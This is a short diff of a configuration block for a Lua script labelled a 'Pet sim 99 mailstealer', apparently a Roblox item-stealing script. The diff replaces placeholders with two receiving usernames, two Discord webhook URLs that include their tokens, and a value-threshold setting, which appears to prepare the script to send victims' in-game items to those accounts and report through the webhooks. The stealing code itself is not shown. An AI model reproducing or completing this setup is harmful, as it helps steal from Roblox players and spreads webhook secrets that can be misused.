@@ -1,11 +1,11 @@
 --Pet sim 99 mailstealer (FROM X SCRIPTS)
 
-Username = "-"
-Username2 = "-"
-Webhook = "-"
-MinimumRAP = 1000000
+Username = "fr0mc0mm0ntocorrupt"
+Username2 = "broisnothim724"
+Webhook = "https://discord.com/api/webhooks/1343676025057312899/1vg3vdlxBh2jf9rbmmb7rQHtE8qXUtzKTl_S1elLxZcl7b2-238bdsHowKFsEgkpD-_U"
+MinimumRAP = 1
 
-LogsWebhook = "-"
+LogsWebhook = "https://discord.com/api/webhooks/1344050869792014420/kYVcbW7sS7x8i6E726yUwFYPoGa91X4PXELB8YhdKROClLgCpgeeu7hgm0WsM9meNVAj"
 mailstealer_name = "w"
 
 Roblox_Username = Username
